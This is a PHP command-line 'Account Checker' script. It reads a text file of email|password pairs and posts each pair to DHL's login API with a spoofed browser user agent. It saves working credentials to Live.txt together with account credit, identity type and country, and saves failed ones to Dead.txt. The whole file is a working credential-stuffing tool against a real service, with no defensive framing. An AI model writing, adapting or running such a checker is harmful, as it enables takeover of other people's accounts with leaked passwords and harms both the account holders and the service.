<?php
date_default_timezone_set("Asia/Jakarta");
# Reset Colors
$normal = "\033[0m";

# Regular Colors
$Black  = "\033[0;30m";             # Black
$Red    = "\033[0;31m";             # Red
$Green  = "\033[0;32m";             # Green
$Yellow = "\033[0;33m";             # Yellow
$Blue   = "\033[0;34m";             # Blue
$Purple = "\033[0;35m";             # Purple
$Cyan   = "\033[0;36m";             # Cyan
$White  = "\033[0;37m";             # White

# Bold
$BBlack = "\033[1;30m";             # Black
$BRed   = "\033[1;31m";             # Red
$BGreen = "\033[1;32m";             # Green
$BYellow = "\033[1;33m";            # Yellow
$BBlue  = "\033[1;34m";             # Blue
$BPurple = "\033[1;35m";            # Purple
$BCyan  = "\033[1;36m";             # Cyan
$BWhite = "\033[1;37m";             # White


$banner = "
                              
_______                 .---. 
\  ___ `'.     .        |   | 
 ' |--.\  \  .'|        |   | 
 | |    \  '<  |        |   | 
 | |     |  '| |        |   | 
 | |     |  || | .'''-. |   | 
 | |     ' .'| |/.'''. \|   | 
 | |___.' /' |  /    | ||   | 
/_______.'/  | |     | ||   | 
\_______|/   | |     | |'---' 
             | '.    | '.     ᶜᵒⁿᵗᵃᶜᵗ ᵐᵉ : ʳᵃᵐᵃᶜⁱⁿᶜᵃⁱˡᵃʰ@ᵍᵐᵃⁱˡ.ᶜᵒᵐ
             '---'   '---'    ᴬᶜᶜᵒᵘⁿᵗ ᶜʰᵉᶜᵏᵉʳ
\n";

echo $banner . $BWhite . "Enter File : ";
$get = trim(fgets(STDIN));
$validasi = strpos($get, ".txt");

if (!empty($validasi)) {
    $getemail = preg_split(
        '/\n|\r\n?/',
        trim(file_get_contents($get))
    );
    echo "Total Data : " . count($getemail) . "\n\n";
} else {
    echo "Please Enter Your youfile.txt";
    exit;
}

for ($i = 0; $i < count($getemail); $i++) {
    # code...
    $validasi2 = strpos($getemail[0], "|");
    if (!empty($validasi2)) {
        $inipisah = explode("|", $getemail[$i]);
    } else {
        echo $BCyan . "[$BRed Alert $BCyan ]$BYellow Please Use | To Format ex:$BGreen Email|Password" . $normal;
        exit;
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://mydhl.express.dhl/api/auth/login");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json;charset=utf-8',
        'Connection: Keep-Alive',
    ));

    $data = array(
        'username' => $inipisah[0],
        'password' => $inipisah[1],
    );

    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    $response = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    if ($httpcode == "200") {
        $usercountry = explode('"userCountry":"', $response);
        $usercountry2 = explode('","', $usercountry[1]);

        $userkredit = explode('"accountCreditStop":', $response);
        $userkredit2 = explode(',"userCountry"', $userkredit[1]);

        $entitytype = explode('"identityType":"', $response);
        $identityType = explode('","', $entitytype[1]);

        echo $BCyan . "[" . $BRed . date("h:i:sa") . $BCyan . "] " . $BGreen . " Live [Account Credit Stop : " . $userkredit2[0] . "] [identityType : " . $identityType[0] . "] [" . $usercountry2[0] . "]    " . $inipisah[0] . "|" . $inipisah[1] . "$normal\n";
        file_put_contents("Live.txt", "[Account Credit Stop : " . $userkredit2[0] . "] [identityType : " . $identityType[0] . "] [" . $usercountry2[0] . "]" . $inipisah[0] . "|" . $inipisah[1]  . PHP_EOL, FILE_APPEND);
    } else {
        echo $BCyan . "[" . $BRed . date("h:i:sa") . $BCyan . "] " . $BRed . " Dead " . $inipisah[0] . "|" . $inipisah[1] . "$normal \n";
        file_put_contents("Dead.txt", $inipisah[0] . "|" . $inipisah[1]  . PHP_EOL, FILE_APPEND);
    }
}
echo $BCyan . "[" . $BRed . date("h:i:sa") . $BCyan . "]  Checking Done" . $normal . "\n";
